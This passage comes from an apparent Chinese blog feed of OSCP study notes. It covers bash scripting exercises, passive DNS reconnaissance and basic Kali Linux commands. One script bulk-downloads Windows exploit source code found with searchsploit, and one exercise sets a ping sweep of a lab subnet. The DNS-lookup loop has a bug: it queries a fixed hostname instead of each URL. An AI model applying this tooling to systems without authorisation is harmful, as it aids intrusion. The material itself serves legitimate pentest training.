class="string">&quot;\033[0m&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; url_ip.txt</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">cat</span> url_uniq.txt)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="comment"># 通过host命令查询到域名对应的IP地址, 如果是多个IP地址就用空格隔开输出。</span></span><br><span class="line">  ip=$(host app.hao123.com | grep <span class="string">&quot;address&quot;</span> | <span class="built_in">cut</span> -d <span class="string">&quot; &quot;</span> -f 4 | sed -z <span class="string">&quot;s/\n/  /g&quot;</span>)</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span> --&gt; [ <span class="variable">$ip</span> ]&quot;</span> &gt;&gt; url_ip.txt</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[33mPRINT URL IP&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[0m&quot;</span></span><br><span class="line"><span class="built_in">cat</span> url_ip.txt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">root_dir=<span class="string">&quot;/home/kali/MORII_TEMP/bash_programe/exp/exp_2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="variable">$root_dir</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">mkdir</span> <span class="variable">$root_dir</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(searchsploit afd windows -w -t | grep http | <span class="built_in">cut</span> -f 2 -d <span class="string">&quot;|&quot;</span> | sed <span class="string">&quot;s/exploits/raw/&quot;</span>)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  name=$(<span class="built_in">echo</span> <span class="variable">$i</span> | <span class="built_in">cut</span> -f 5 -d <span class="string">&quot;/&quot;</span>)</span><br><span class="line">  curl -s -o <span class="variable">$root_dir</span>/<span class="variable">$name</span>.c <span class="variable">$i</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;exp-<span class="variable">$name</span>: downlond done&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;exp-<span class="variable">$name</span>: downlond err&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1、使用Bash循环进行研究并编写一个短脚本，对IP范围为10.11.1.0/24的目标进行ping扫描。</span></span><br><span class="line"><span class="comment"># 2、尝试使用高级脚本语言（如Python、Perl或Ruby）完成上述练习。</span></span><br><span class="line"><span class="comment"># 3、使用本模块中的实际示例帮助您创建一个Bash脚本，从access_log.txt文件（http://www.offensive-security.com/pwkfiles/access_log.txt.gz）中提取JavaScript文件。确保文件名不包括路径，且是唯一且已排序的。</span></span><br><span class="line"><span class="comment"># 4、使用另一种语言（如Python、Perl或Ruby）重新编写前面的练习。</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP学习 </tag>
            
            <tag> Bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS被动信息收集</title>
      <link href="/2023/10/20/DNS%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2023/10/20/DNS%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="DNS-被动信息收集"><a href="#DNS-被动信息收集" class="headerlink" title="DNS 被动信息收集"></a>DNS 被动信息收集</h1><h2 id="域名查询类型介绍"><a href="#域名查询类型介绍" class="headerlink" title="域名查询类型介绍"></a>域名查询类型介绍</h2><table><thead><tr><th>查询类型</th><th>结果</th></tr></thead><tbody><tr><td>A</td><td>IPv4 地址</td></tr><tr><td>AAAA</td><td>IPv6 地址</td></tr><tr><td>CNAME</td><td>规范名称（别名记录）</td></tr><tr><td>MX</td><td>邮箱服务器</td></tr><tr><td>SOA</td><td>授权起始</td></tr><tr><td>TXT</td><td>TXT 记录</td></tr></tbody></table><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a><code>dig</code></h3><blockquote><p>命令格式： <code>dig</code> <code>@DOMAIN_SERVER_IP</code> <code>DOMAIN</code> <code>TYEP</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在8.8.8.8 域名服务器中查询tryhackme.com的A类型的子域名信息</span></span><br><span class="line">dig @8.8.8.8 tryhackme.com A</span><br></pre></td></tr></table></figure><h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a><code>nslookup</code></h3><blockquote><p>命令格式： <code>nslookup</code> <code>-type=TYPE</code> <code>DOMAIN</code> <code>DOMAIN_SERVER</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在8.8.8.8 域名服务器中查询tryhackme.com的A类型的子域名信息</span></span><br><span class="line">nslookup -<span class="built_in">type</span>=A tryhackme.com 8.8.8.8</span><br></pre></td></tr></table></figure><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a><code>whois</code></h3><blockquote><p>命令格式： <code>whois</code> <code>DOMAIN/IP</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询tryhackme.com的 whois 信息</span></span><br><span class="line">whois tryhackme.com</span><br></pre></td></tr></table></figure><h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><h3 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a><a href="https://www.shodan.io/">shodan</a></h3><blockquote><p>用于被动收集子域名信息</p></blockquote><h3 id="DnsDumpster"><a href="#DnsDumpster" class="headerlink" title="DnsDumpster"></a><a href="https://dnsdumpster.com/">DnsDumpster</a></h3><blockquote><p>用于被动子收集子域名信息</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP学习 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali-Linux基本使用</title>
      <link href="/2023/10/20/Kali-Linux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/10/20/Kali-Linux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="kali-linux-一般目录结构"><a href="#kali-linux-一般目录结构" class="headerlink" title="kali linux 一般目录结构"></a>kali linux 一般目录结构</h1><hr><blockquote><p>只列出相对重要的目录</p></blockquote><hr><table><thead><tr><th>目录名</th><th><strong>目录作用</strong></th></tr></thead><tbody><tr><td>&#x2F;bin</td><td>存放系统基本程序(ls, cd, cat,等)</td></tr><tr><td>&#x2F;sbin</td><td>存放系统程序(fdisk, mkfs, sysctl,等)</td></tr><tr><td>&#x2F;etc</td><td>存放配置文件</td></tr><tr><td>&#x2F;tmp</td><td>存放临时文件(通常在启动时删除)</td></tr><tr><td>&#x2F;usr&#x2F;bin</td><td>存放应用程序(apt, ncat, nmap,等)</td></tr><tr><td>&#x2F;usr&#x2F;share</td><td>存放应用程序支持和数据文件</td></tr></tbody></table><h1 id="kali-linux-文件查找命令"><a href="#kali-linux-文件查找命令" class="headerlink" title="kali linux 文件查找命令"></a>kali linux 文件查找命令</h1><hr><blockquote><p>基本用法介绍</p></blockquote><table><thead><tr><th>命令名</th><th>用法</th></tr></thead><tbody><tr><td>which</td><td>查找命令的绝对路径(一般是在$PATH 中定义了的) <code> which &lt;command name&gt;</code></td></tr><tr><td>find</td><td>较之前两个命令该命令更加灵活，但是使比较复杂。 <code>find / -name sdb*</code>: 查找根目录下以 sdb 开头的文件 。查找<code>-mtime 0</code>  最近 24 小时修改的文件，<code>-mtine 1</code>  最近 48-24 小时内修改的文件，不包含 0-24 小时。</td></tr><tr><td>locate</td><td>在 kali 中最快查找文件与目录, 内置 locate.db 数据库，用<code>updatedb</code>命令更新。<code>locate &lt;filename | dir_name&gt;</code></td></tr></tbody></table><h1 id="kali-linux-中服务管理"><a href="#kali-linux-中服务管理" class="headerlink" title="kali linux 中服务管理"></a>kali linux 中服务管理</h1><hr><blockquote><p><code>kali linux</code>中常用<code>systemctl</code>命令进行服务管理。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl &lt;args&gt; &lt;server-name&gt;</span><br><span class="line">systemctl enable --now sshd  // 将ssh服务加入开机启动, 并且立即启动</span><br></pre></td></tr></table></figure><table><thead><tr><th>args 参数</th><th>作用</th></tr></thead><tbody><tr><td>enable</td><td>将服务项加入开机启动</td></tr><tr><td>start</td><td>启动服务</td></tr><tr><td>stop</td><td>停用服务</td></tr><tr><td>status</td><td>查看服务当前状态</td></tr><tr><td>list-unit-files</td><td>查看所有可用服务项</td></tr></tbody></table><h1 id="kali-linux-apt-包管理器常用操作"><a href="#kali-linux-apt-包管理器常用操作" class="headerlink" title="kali linux apt 包管理器常用操作"></a>kali linux apt 包管理器常用操作</h1><hr><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td><code>apt update</code></td><td>更新软件列表</td></tr><tr><td><code>apt upgrade</code></td><td>按照软件列表更新已安装的软件</td></tr><tr><td><code>apt-cache &lt;pakge name&gt;</code></td><td>查找软件(按照软件详情查找)</td></tr><tr><td><code>apt show &lt;pakge name&gt;</code></td><td>查看软件相信信息</td></tr><tr><td><code>apt install &lt;pakge name&gt;</code></td><td>安装应用</td></tr><tr><td><code>apt remove [--purge] &lt;pakge name&gt;</code></td><td>卸载软件, 可能残留用户配置文件,可加<code>--purge</code>参数来再卸载时完全删除</td></tr></tbody></table><blockquote><p><code>dpkg</code>也是可用的包管理器,一般用于离线安装<code>.deb</code>格式安装包。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i &lt;pakge name&gt;.deb</span><br></pre></td></tr></table></figure><h1 id="kali-linux-命令行中重定向和管道符"><a href="#kali-linux-命令行中重定向和管道符" class="headerlink" title="kali linux 命令行中重定向和管道符"></a>kali linux 命令行中重定向和管道符</h1><hr><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><table><thead><tr><th>流名称</th><th>描述</th></tr></thead><tbody><tr><td>STDIN(标准输入)</td><td>数据输入终端</td></tr><tr><td>STDOUT(标准输出)</td><td>程序输出(默认为终端)</td></tr><tr><td>STDERR(标准错误)</td><td>错误消息(默认为终端)</td></tr></tbody></table><blockquote><p>管道( <code>|</code> )和重定向( <code>&lt;</code> 和 <code>&gt;</code> )在程序和文件直接连接这些流,以适应几乎无限数量的可能用例。</p></blockquote><table><thead><tr><th align="center">运算符</th></tr></thead><tbody><tr><td align="center">|</td></tr><tr><td align="center">&gt;</td></tr><tr><td align="center">&lt;</td></tr><tr><td align="center">&gt;&gt;</td></tr></tbody></table><h2 id="一般用法"><a href="#一般用法" class="headerlink" title="一般用法"></a>一般用法</h2><h3 id="的使用"><a href="#的使用" class="headerlink" title="| 的使用"></a><code>|</code> 的使用</h3><blockquote><p>将前一个命令的输出重定向到另一个命令的输入。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr | grep &quot;eth0&quot;</span><br></pre></td></tr></table></figure><h3 id="和-的使用与区别"><a href="#和-的使用与区别" class="headerlink" title="&gt; 和 &gt;&gt; 的使用与区别"></a><code>&gt;</code> 和 <code>&gt;&gt;</code> 的使用与区别</h3><blockquote><p><code>&gt;</code> 重定向到新文件, 将前一个命令的输出保存到文件中, 注意如果重定向的文件不存在会自动创建, 如果存在会覆盖原文件中的内容。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test&quot; &gt; my.txt</span><br><span class="line">cat my.txt</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure><blockquote><p><code>&gt;&gt;</code> 重定向到现有文件。用法和前面一样只是不会覆盖原文件内容。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat my.txt</span><br><span class="line"></span><br><span class="line">test1</span><br><span class="line"></span><br><span class="line">echo &quot;test&quot; &gt;&gt; my.txt</span><br><span class="line">cat my.txt</span><br><span class="line"></span><br><span class="line">test1</span><br><span class="line">test</span><br></pre></td></tr></table></figure><blockquote><p><code>&gt;</code> 重定向 STDERR。<br>根据规范描述<code>STDIN</code>、<code>STDOUT</code>、<code>STDERR</code>分别定义为: <code>0</code>、<code>1</code>、<code>2</code>。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ping -c 2 127.0.0.1 0&gt; MY_INPUT.txt</span><br><span class="line">cat MY_INPUT.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&#x27;1&gt;&#x27;</span> 和 <span class="string">&#x27;&gt;&#x27;</span> 的作用相当</span></span><br><span class="line">ping -c 2 127.0.0.1 1&gt; COMMAND_OUT.txt</span><br><span class="line">cat COMMAND_OUT.txt</span><br><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.041 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.027 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 1042ms</span><br><span class="line">rtt min/avg/max/mdev = 0.027/0.034/0.041/0.007 ms</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将错误信息重定向到文件中</span></span><br><span class="line">ping -c 2 127.0.0.1 2&gt; COMMAND_ERR.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">该命令无错误, 所以文件没有任何内容。</span></span><br><span class="line">cat COMMAND_ERR.txt</span><br></pre></td></tr></table></figure><blockquote><p>上述的代码中, 如果重定向符 <code>&gt;</code> 前为 0, 将标准输入写入到文件中。<br>上述的代码中, 如果重定向符 <code>&gt;</code> 前为 1, 将命令标准输出写入到文件中。<br>上述的代码中, 如果重定向符 <code>&gt;</code> 前为 2, 如果命令执行错误, 将错误信息写入到文件中。</p></blockquote><h3 id=""><a href="#" class="headerlink" title="&lt; 的使用"></a><code>&lt;</code> 的使用</h3><blockquote><p>将文件重定向到前一个命令的 STDIN</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wc -m &lt; my.txt</span><br></pre></td></tr></table></figure><h1 id="kali-linux-文字搜索和处理命令"><a href="#kali-linux-文字搜索和处理命令" class="headerlink" title="kali linux 文字搜索和处理命令"></a>kali linux 文字搜索和处理命令</h1><hr><h2 id="uniq-命令"><a href="#uniq-命令" class="headerlink" title="uniq 命令"></a><code>uniq</code> 命令</h2><blockquote><p><code>uniq</code> 是一个用于对文件或标准输入进行去重操作的命令。它会将相邻的重复行合并为一行，只输出不重复的行。如果对一个乱序的文件进行去重，需要先使用<code>sort</code>进行排序。</p></blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-c</code></td><td>在输出结果前添加每行的重复次数。</td></tr><tr><td><code>-d</code></td><td>只输出重复的行。</td></tr><tr><td><code>-u</code></td><td>只输出不重复的行。</td></tr><tr><td><code>-f &lt;字段&gt;</code></td><td>忽略指定字段数目的开头字符。</td></tr><tr><td><code>-s &lt;字符数&gt;</code></td><td>跳过指定数目的开头字符。</td></tr></tbody></table><p>示例用法：</p><table><thead><tr><th>用法</th><th>描述</th></tr></thead><tbody><tr><td><code>uniq file.txt</code></td><td>从文件中去除重复行，并输出不重复的行。</td></tr><tr><td><code>uniq -c file.txt</code></td><td>输出每行重复的次数，并在结果前加上计数。</td></tr><tr><td><code>uniq -d file.txt</code></td><td>只输出文件中出现过一次以上的重复行。</td></tr><tr><td><code>uniq -u file.txt</code></td><td>只输出文件中没有重复的行。</td></tr><tr><td><code>uniq -f 2 file.txt</code></td><td>忽略每行开头的前两个字段，然后进行去重操作。</td></tr><tr><td><code>uniq -s 5 file.txt</code></td><td>跳过每行开头的前五个字符，然后进行去重操作。</td></tr></tbody></table><p>使用 <code>uniq</code> 命令时，可以根据需要选择适当的参数和示例用法。</p><h2 id="sort-命令详解"><a href="#sort-命令详解" class="headerlink" title="sort 命令详解"></a><code>sort</code> 命令详解</h2><blockquote><p><code>sort</code> 是一个用于对文本文件进行排序的命令。它按照指定的排序规则对输入进行排序，并将结果输出到标准输出或指定的文件中。</p></blockquote><p>常用参数</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-b</code></td><td>忽略行首的空格字符。</td></tr><tr><td><code>-f</code></td><td>忽略大小写进行排序。</td></tr><tr><td><code>-n</code></td><td>按照数值大小进行排序。</td></tr><tr><td><code>-r</code></td><td>逆序排序，以降序输出结果。</td></tr><tr><td><code>-u</code></td><td>去除重复行，只输出唯一的行。</td></tr><tr><td><code>-k &lt;字段&gt;</code></td><td>按照指定字段进行排序。</td></tr><tr><td><code>-t &lt;分隔符&gt;</code></td><td>指定字段的分隔符。</td></tr></tbody></table><table><thead><tr><th>用法</th><th>描述</th></tr></thead><tbody><tr><td><code>sort file.txt</code></td><td>对文件进行排序，并将结果输出到标准输出。</td></tr><tr><td><code>sort -f file.txt</code></td><td>忽略大小写进行排序。</td></tr><tr><td><code>sort -n file.txt</code></td><td>按照数值大小进行排序。</td></tr><tr><td><code>sort -r file.txt</code></td><td>逆序排序，以降序输出结果。</td></tr><tr><td><code>sort -u file.txt</code></td><td>去除重复行，只输出唯一的行。</td></tr><tr><td><code>sort -k 2 file.txt</code></td><td>按照指定字段进行排序。</td></tr><tr><td><code>sort -t &#39;,&#39; -k 3 file.txt</code></td><td>指定字段的分隔符为逗号，并按照第三个字段排序。</td></tr></tbody></table><blockquote><p>使用 <code>sort</code> 命令时，可以根据需要选择适当的参数和示例用法。希望这个表格能够帮助你更好地理解和记录 <code>sort</code> 命令的各个参数和示例用法！如果有任何问题，请随时提问。</p></blockquote><h2 id="grep-命令"><a href="#grep-命令" class="headerlink" title="grep 命令"></a><code>grep</code> 命令</h2><blockquote><p><code>grep</code> 在文本文件搜索给定正则表达式的值的匹配项, 然后输出(通常在终端中)。</p></blockquote><p>常用命令:</p><table><thead><tr><th align="center">参数</th><th>描述</th></tr></thead><tbody><tr><td align="center">-r</td><td>进行递归搜索</td></tr><tr><td align="center">-i</td><td>忽略文本大小写</td></tr><tr><td align="center">-o</td><td>仅输出匹配的部分文本(支持正则表达式)。</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grep &lt;substr&gt; &lt;filename&gt;</span><br><span class="line">echo &lt;str&gt; | grep &lt;subsre&gt;</span><br><span class="line">echo &quot;Hello world&quot; | grep &quot;H&quot;</span><br><span class="line">grep &quot;a&quot; /etc/passwd</span><br><span class="line">ip addr | grep &quot;inet&quot;</span><br></pre></td></tr></table></figure><h2 id="sed-命令"><a href="#sed-命令" class="headerlink" title="sed 命令"></a><code>sed</code> 命令</h2><blockquote><p><code>sed</code> 命令很强大, 只介绍一下他的简单使用。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">该命令为将前面输出的字符串中的 hard 替换为 harder, 加 g 匹配所有的，不加只匹配第一个</span></span><br><span class="line">echo &quot;I need to try hard&quot; | sed &#x27;s/hard/harder/g&#x27;</span><br></pre></td></tr></table></figure><h2 id="cut-命令"><a href="#cut-命令" class="headerlink" title="cut 命令"></a><code>cut</code> 命令</h2><blockquote><p><code>cut</code>命令, 从一行中提取一段文本并将其输出到标准输出</p></blockquote><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令:"></a>常用命令:</h3><table><thead><tr><th align="center">参数</th><th>描述</th></tr></thead><tbody><tr><td align="center">-f</td><td>要剪切的字段编号</td></tr><tr><td align="center">-d</td><td>划分的字符(单字符)</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">该命令为将前面输出的字符串中的 hard 替换为 harder</span></span><br><span class="line">echo &quot;I hack binaries,web apps,mobile apps, and just about anything else&quot;| cut -f 2 -d &quot;,&quot;</span><br></pre></td></tr></table></figure><h2 id="awk-命令"><a href="#awk-命令" class="headerlink" title="awk 命令"></a><code>awk</code> 命令</h2><blockquote><p><code>awk</code> 命令, 专为文本处理而设计的编程语言。很强大，但很复杂，只做简单使用。</p></blockquote><h3 id="一般格式"><a href="#一般格式" class="headerlink" title="一般格式:"></a>一般格式:</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F &lt;substr&gt; &#x27;&#123;[print &lt;format print&gt;]&#125;&#x27; &lt;filename or str&gt;</span><br></pre></td></tr></table></figure><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令:"></a>常用命令:</h3><table><thead><tr><th align="center">参数</th><th>描述</th></tr></thead><tbody><tr><td align="center">-F</td><td>分割字符段</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;hello::there::friend&quot; | awk -F &quot;::&quot; &#x27;&#123;print $1, $3&#125;&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将<span class="built_in">echo</span>输出的字符串按照<span class="string">&quot;::&quot;</span>分为三段, 再通过<span class="built_in">print</span>命令打印第一段和第三段</span></span><br></pre></td></tr></table></figure><h2 id="seq-命令"><a href="#seq-命令" class="headerlink" title="seq 命令"></a><code>seq</code> 命令</h2><p><code>seq</code> 命令用于生成数字或字符的序列。在需要迭代一系列数值的各种脚本场景中非常有用。<code>seq</code> 命令的通用语法如下：</p><ul><li><code>开始值</code> 是序列的起始值。</li><li><code>步长</code> 指定序列中每个数之间的增量，可以是正数或负数。</li><li><code>结束值</code> 是序列的结束值。</li></ul><p>以下是 <code>seq</code> 命令的一些常用选项：</p><ul><li><code>-s, --separator=字符串</code>：指定数字之间的自定义分隔符。</li><li><code>-w, --equal-width</code>：确保所有数字具有相同的宽度，通过在前面填充零实现。</li><li><code>-f, --format=格式</code>：使用指定的格式对输出进行格式化，格式可以包含类似 printf 的格式说明符。</li></ul><h1 id="kali-linux-文件对比命令"><a href="#kali-linux-文件对比命令" class="headerlink" title="kali linux 文件对比命令"></a>kali linux 文件对比命令</h1><p>–</p><h2 id="comm-命令"><a href="#comm-命令" class="headerlink" title="comm 命令"></a><code>comm</code> 命令</h2><blockquote><p><code>comm</code> 命令比对两个文本文件，显示每个文本的唯一行和它们的共有行。<br>它输出三列：第一个文件或者参数唯一行 | 第二个文件唯一行 | 两个文件共有行</p></blockquote><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th align="center">参数</th><th>描述</th></tr></thead><tbody><tr><td align="center">-n</td><td>n 为不需要显示行数(1-3)</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只显示第三行</span></span><br><span class="line">comm -12 scan-a.txt scan-b.txt</span><br></pre></td></tr></table></figure><h2 id="diff-命令"><a href="#diff-命令" class="headerlink" title="diff 命令"></a><code>diff</code> 命令</h2><blockquote><p><code>diff</code> 命令比对两个文本文件，功能和 <code>comm</code> 类似但是更加复杂，只做简单使用</p></blockquote><h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th align="center">参数</th><th>描述</th></tr></thead><tbody><tr><td align="center">-c</td><td>上下文格式显示</td></tr><tr><td align="center">-u</td><td>统一格式显示</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认只显示两个文件不共有的行</span></span><br><span class="line">diff scan-a.txt scan-b.txt</span><br></pre></td></tr></table></figure><h2 id="vimdiff-命令"><a href="#vimdiff-命令" class="headerlink" title="vimdiff 命令"></a><code>vimdiff</code> 命令</h2><blockquote><p><code>vimdiff</code> 使用 vim 打开多个文件，每个窗口中显示文件之间的差异，在视觉上更容易检查他们。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vimdiff scan-a.txt scan-b.txt</span><br></pre></td></tr></table></figure><h1 id="kali-linux-终端进程管理"><a href="#kali-linux-终端进程管理" class="headerlink" title="kali linux 终端进程管理"></a>kali linux 终端进程管理</h1><blockquote><p>前台运行进程会占用终端，对于需要长时间占用的命令可以放在后台处理。在命令结尾添加 <code>&amp;</code> 符号，可将进程添加到后台处理。当然长时间放在后台处理，可能造成进程报错。被挂在后台的进程被称为<code>jobs</code>。</p><p>在终端中, <code>ctrl+c</code>是停止当前命令，<code>ctrl+z</code>是暂停当前命令。</p></blockquote><hr><h2 id="后台处理-bg"><a href="#后台处理-bg" class="headerlink" title="后台处理(bg)"></a>后台处理(<code>bg</code>)</h2><blockquote><p><code>bg</code> 命令可将暂停的命令在后台恢复。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ ping -c 400 localhost &gt; ping_results.txt</span><br><span class="line">^Z</span><br><span class="line">[1]+ Stopped ping -c 400 localhost &gt; ping_results.txt</span><br><span class="line">kali@kali:~$ bg</span><br><span class="line">[1]+ ping -c 400 localhost &gt; ping_results.txt</span><br><span class="line">kali@kali:~$</span><br></pre></td></tr></table></figure><h2 id="jobs-控制-jobs-和-fg"><a href="#jobs-控制-jobs-和-fg" class="headerlink" title="jobs 控制(jobs 和 fg)"></a><code>jobs</code> 控制(<code>jobs</code> 和 <code>fg</code>)</h2><blockquote><p><code>jobs</code> 命令查看当前终端后台中运行的命令。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/MORII_TEMP/bg_process]</span><br><span class="line">└─$ jobs</span><br><span class="line">[2]  + running    ping -c 400 localhost &gt; ping_result.txt</span><br></pre></td></tr></table></figure><blockquote><p><code>fg</code> 是将当前后台运行的命令，拿到前台运行。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将jobsid为1的进程拿到前台运行</span></span><br><span class="line">fg %1</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">JOBID</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">%Number</td><td align="center">Number 指的是作业编号，使用 jobs 查看后台进程时<code>[]</code>中的数字即是。</td></tr><tr><td align="center">%String</td><td align="center">指挂起命令的名称的开头，例如: %ping。</td></tr><tr><td align="center">%+OR%%</td><td align="center">指当前的 